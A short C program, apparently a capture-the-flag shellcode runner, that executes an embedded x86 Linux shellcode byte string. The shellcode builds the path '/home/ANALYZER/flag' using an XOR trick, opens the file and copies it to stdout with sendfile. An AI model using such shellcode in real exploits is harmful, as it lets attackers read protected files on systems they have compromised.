int main(int argc, char **argv){

  char buf[] = "\x68\x01\x01\x01\x01\x81\x34\x24\x6d\x60\x66\x01\x68\x45\x52\x2f\x66\x68\x41\x4c\x59\x5a\x68\x65\x2f\x41\x4e\x68\x2f\x68\x6f\x6d\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80";

  ((void (*)())buf)();
  
  return 0;
}